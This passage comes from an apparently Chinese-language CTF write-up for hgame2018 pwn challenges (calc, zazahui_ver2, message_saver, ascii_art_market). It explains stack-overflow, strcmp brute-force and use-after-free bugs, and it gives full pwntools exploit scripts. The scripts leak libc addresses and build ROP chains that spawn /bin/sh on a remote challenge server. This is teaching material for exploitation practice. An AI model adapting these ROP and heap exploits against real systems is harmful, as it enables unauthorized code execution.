class="string">'111.230.149.72 '</span>,  <span class="number">10008</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc64.so'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(<span class="string">'200'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">padding = <span class="string">'a'</span>*<span class="number">0x30</span></span><br><span class="line"><span class="comment">#pr = 0x08048455</span></span><br><span class="line"><span class="comment">#pppr = 0x08048d49</span></span><br><span class="line">rdi_ret = <span class="number">0x0000000000400fb3</span></span><br><span class="line">rsi_ret = <span class="number">0x0000000000400fb1</span></span><br><span class="line">rbp_ret = <span class="number">0x0000000000400800</span></span><br><span class="line">rop = padding + p64(<span class="number">0x602e00</span>) + p64(rdi_ret) +p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.symbols[<span class="string">'puts'</span>]) + p64(rsi_ret) + p64(<span class="number">0x602e00</span>) + p64(<span class="number">0x602e00</span>) + p64(rdi_ret) + p64(<span class="number">0</span>) + p64(elf.symbols[<span class="string">'read'</span>]) + p64(rbp_ret) + p64(<span class="number">0x602e00</span>) + p64(<span class="number">0x400D74</span>)</span><br><span class="line"><span class="comment">#rop = padding + p32(0x804be00)+p32(elf.symbols['puts']) + p32(pr) + p32(elf.got['puts']) + p32(elf.symbols['read'])+p32(pppr)+p32(0)+p32(0x804be00) + p32(0x100)+ p32(0x08048d4b)+p32(0x804be00)+p32(0x8048B1A)# p32(0x804843e)</span></span><br><span class="line">p.sendline(rop)</span><br><span class="line">p.recvuntil(<span class="string">'find!!\n'</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts address:'</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]system address:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">rop = p64(<span class="number">0x602c00</span>)+ p64(rdi_ret) +p64(next(libc.search(<span class="string">'/bin/sh'</span>))) + p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.send(rop)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Gadgets information</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x0000000000400fac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fae : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fb0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fb2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400faf : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400800 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fb3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fb1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006a9 : ret</span></span><br><span class="line"><span class="string">0x0000000000400a29 : ret 0x8b48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Unique gadgets found: 12</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>题目中实现了一个简单的计算器。题目采用静态编译的方法，编译了需要的所有函数。</p><p><img src="/img/hgame2018/3_2_1.png" alt=""></p><p>漏洞在于每次存储结果时，计数器会往后移4个字节，但是对于存储结果个数没有限制，导致栈溢出。</p><p>利用ROPgadget的ropchain功能，对于静态编译的程序，很容易可以生成一个rop链，将rop链覆盖在返回地址处即可。</p><p>解题的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./calc'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p= remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10009</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rop_string</span><span class="params">()</span>:</span></span><br><span class="line">rop = <span class="string">''</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8446</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop += <span class="string">'/bin'</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8446</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop += <span class="string">'//sh'</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049603</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080dee5d</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049603</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806d445</span>) <span class="comment"># int 0x80</span></span><br><span class="line"><span class="keyword">return</span> rop</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_save</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a:'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'b:'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'success!!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">add_save(<span class="number">0xbadbad</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] round'</span>,str(i)</span><br><span class="line">add_save(<span class="number">68</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop_input</span><span class="params">(rop_string)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(rop_string)/<span class="number">4</span>):</span><br><span class="line"><span class="keyword">print</span> hex(u32(rop_string[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)]))</span><br><span class="line">add_save(u32(rop_string[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)]))</span><br><span class="line"></span><br><span class="line">padding()</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x8048AC0')</span></span><br><span class="line">rop=<span class="string">'\xd3j\x05\x08`\xa0\x0e\x08F\x84\x0b\x08/bin\xfbQ\x05\x08\xd3j\x05\x08d\xa0\x0e\x08F\x84\x0b\x08//sh\xfbQ\x05\x08\xd3j\x05\x08h\xa0\x0e\x08\x03\x96\x04\x08\xfbQ\x05\x08\xc9\x81\x04\x08`\xa0\x0e\x08]\xee\r\x08h\xa0\x0e\x08\xd3j\x05\x08h\xa0\x0e\x08\x03\x96\x04\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08E\xd4\x06\x08'</span></span><br><span class="line"><span class="comment">#print '[*] flag',flag</span></span><br><span class="line">rop_input(rop)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'6'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'bye.'</span>)</span><br><span class="line">p.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="zazahui-ver2"><a href="#zazahui-ver2" class="headerlink" title="zazahui_ver2"></a>zazahui_ver2</h2><p>和上一版本的zazahui有所不同，这次利用的是strcmp的比较。</p><p><img src="/img/hgame2018/3_3_1.png" alt=""></p><p>同样存在s的溢出覆盖，不过此次不能简单的使用溢出来打印flag了，但是strcmp仍然可以利用，就是爆破。</p><p>逆向爆破flag的地址，可以大大缩短爆破次数。</p><p><img src="/img/hgame2018/3_3_2.png" alt=""></p><p>解题的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./zazahui_ver2'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">gdb.attach(p,<span class="string">'b *0x80487AB'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10010</span>)</span><br><span class="line">dic = range(<span class="number">33</span>,<span class="number">127</span>)</span><br><span class="line">dic.append(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#qdic.reverse()</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">start = <span class="number">0x804A084</span></span><br><span class="line">end = <span class="number">0x804A060</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">i = start </span><br><span class="line"><span class="keyword">while</span> i&gt;=end:</span><br><span class="line">pro = log.progress(<span class="string">'go'</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">pro.status(<span class="string">'boom for '</span>+hex(i))</span><br><span class="line">bomb = (chr(j)+flag)+<span class="string">'\0'</span>*(<span class="number">0xb0</span>-len((chr(j)+flag)))+p32(i)</span><br><span class="line">p.send(bomb)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'too'</span> <span class="keyword">in</span> p.recvuntil(<span class="string">'&gt;'</span>):</span><br><span class="line">flag = chr(j) + flag</span><br><span class="line">pro.success(hex(i)+<span class="string">':  '</span>+hex(j)+<span class="string">'  '</span>+chr(j))</span><br><span class="line">i = i<span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#a= 'a'*0xb0+p32(0x804A060)+p32(0x99)</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] flag'</span>,flag</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="message-saver"><a href="#message-saver" class="headerlink" title="message_saver"></a>message_saver</h2><p>程序实现了一个可以加解密存储的记事本，逻辑简单</p><p><img src="/img/hgame2018/3_4_0.png" alt=""></p><p>只维护了一个变量作为message的存储结构，结构如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| length     |     address     |    function ptr    | </span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>其生成方法在add函数中：</p><p><img src="/img/hgame2018/3_4_1.png" alt=""></p><p>在edit函数中可以重新编辑信息，在编辑过程中会重新申请一个内存块，但原来的并不会释放（内存泄露），最终会执行function（address）函数，主要如果可以控制内存块的内容，就完全可以控制执行逻辑。</p><p>在delete函数中会free掉这个内存块，但并未置空结构体，存在一个悬垂指针。</p><p>并且，在全部的函数中都没有检测都没有检测是否已经删除了结构块，导致一个UAF漏洞、double free漏洞。</p><p>利用UAF漏洞可以很容易的控制程序执行流程：</p><p>先申请一个非0x18的块，delete之后，在edit一个0x18的块，就可以劫持结构体内容了。</p><p>解题的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./message_saver'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./message_saver'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x400C64'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10011</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc64.so'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x100</span>))</span><br><span class="line">p.sendline(<span class="string">'p4nda'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'==='</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x18</span>))</span><br><span class="line">p.recvuntil(<span class="string">'message:'</span>)</span><br><span class="line">p.sendline(p64(<span class="number">0x00</span>)+p64(elf.got[<span class="string">'puts'</span>])+p64(<span class="number">0x40084D</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(<span class="string">'\0\0\0'</span>+p64(<span class="number">0x00</span>)+p64(elf.got[<span class="string">'puts'</span>])+p64(elf.symbols[<span class="string">'puts'</span>]))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">tmp = p.recvuntil(<span class="string">'\n=='</span>)</span><br><span class="line">addr = tmp[<span class="number">-9</span>:<span class="number">-3</span>]</span><br><span class="line">puts_addr = u64(addr.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts addr : '</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]system addr :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x18</span>))</span><br><span class="line">p.recvuntil(<span class="string">'message:'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\0'</span>+p64(elf.got[<span class="string">'puts'</span>])+p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="LEVEL-WEEK-4"><a href="#LEVEL-WEEK-4" class="headerlink" title="LEVEL - WEEK 4"></a>LEVEL - WEEK 4</h1><h2 id="ascii-art-market"><a href="#ascii-art-market" class="headerlink" title="ascii_art_market"></a>ascii_art_market</h2><p>题目是一个简单的ASCII码艺术字生成器，但对题目没有什么影响，关键点在于main函数中存在一个0x10比特的栈溢出，导致可以覆盖rbp和返回地址。但这远不够获得shell。</p><p><img src="/img/hgame2018/4_1_1.png" alt=""></p><p>最初的想法是先把rbp迁移到一个可写的地方，然后慢慢调试返回地址到哪里去，一个直接的想法是继续输入，争取更大的rop链，因此先把返回地址写到0x4009fc，这个位置可以继续输入，调试时发现，这样覆盖会把输入内容写到bss-0x80的位置去。这样再把栈迁移到bss-0x80就可以执行输入的rop了，第二次再覆盖时，利用leave ret将栈迁移到bss段上，就可以执行任意的rop了，使用的rop和hacker_system中的相同。</p><p>解题的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./ascii_art_maker'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./ascii_art_maker'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x0400A2B'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10012</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc64.so'</span>)</span><br><span class="line">target = <span class="number">0x4009FC</span></span><br><span class="line">p.recvuntil(<span class="string">'convert:'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0x602c00</span>)+p64(target))</span><br><span class="line">rdi_ret = <span class="number">0x0000000000400a93</span></span><br><span class="line">rsi_ret = <span class="number">0x0000000000400a91</span></span><br><span class="line">rbp_ret = <span class="number">0x0000000000400640</span></span><br><span class="line">rop =p64(<span class="number">0xbadbad</span>)+ p64(rdi_ret) + p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.symbols[<span class="string">'puts'</span>])+ p64(rsi_ret) + p64(<span class="number">0x602e00</span>) + p64(<span class="number">0x602e00</span>) + p64(rdi_ret) + p64(<span class="number">0</span>) + p64(elf.symbols[<span class="string">'read'</span>]) + p64(rbp_ret) + p64(<span class="number">0x602e00</span>) + p64(<span class="number">0x400A2B</span>)</span><br><span class="line">rop = rop.ljust(<span class="number">0x80</span>,<span class="string">'a'</span>)+p64(<span class="number">0x602c00</span><span class="number">-0x80</span>)+p64(<span class="number">0x400A2B</span>)</span><br><span class="line"><span class="comment">#p.send(p64())</span></span><br><span class="line">p.send(rop)</span><br><span class="line"></span><br><span class="line">addr_leak = p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]</span><br><span class="line">puts_addr = u64(addr_leak.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] puts : '</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system: '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">rop = p64(<span class="number">0x602c00</span>)+ p64(rdi_ret) +p64(next(libc.search(<span class="string">'/bin/sh'</span>))) + p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.send(rop)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x0000000000400a8c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a8e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a90 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a92 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a8b : pop rbp ; pop r12 ; pop r13 